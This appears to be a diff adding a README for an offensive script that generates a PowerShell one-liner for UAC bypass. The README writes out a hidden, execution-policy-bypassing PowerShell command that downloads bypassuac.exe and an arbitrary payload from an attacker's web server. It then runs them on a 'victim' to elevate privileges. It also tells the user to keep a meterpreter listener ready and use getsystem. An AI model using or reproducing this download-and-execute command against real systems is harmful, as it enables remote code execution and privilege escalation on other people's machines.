@@ -1,0 +1,13 @@
+## README - psh_bypassuac_generate
+## r1ddl3r - Jake Bernier
+##
+## Example:
+## C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -w hidden -nop -ep bypass -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/bypassuac.exe','bypassuac.exe');(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/abc.exe','abc.exe');start-process -NoNewWindow 'C:\Users\admin\Documents\bypassuac.exe' -args 'elevate /c C:\Users\admin\Documents\abc.exe'
+##
+## Best to run on Kali Linux - need Apache2
+##
+## Simple script to move bypassuac.exe and your payload.exe to apache web server and generate powershell one liner. Powershell line downloads both exe's and executes to elevate privs.
+## bypassuac.exe will create tior.exe in additon to two exe's downloaded on victim
+## Ensure you have listerner  - with meterpreter use getsytem to elevate :)
+##
+## bypassuac.exe found here: https://www.trustedsec.com/downloads/tools-download/
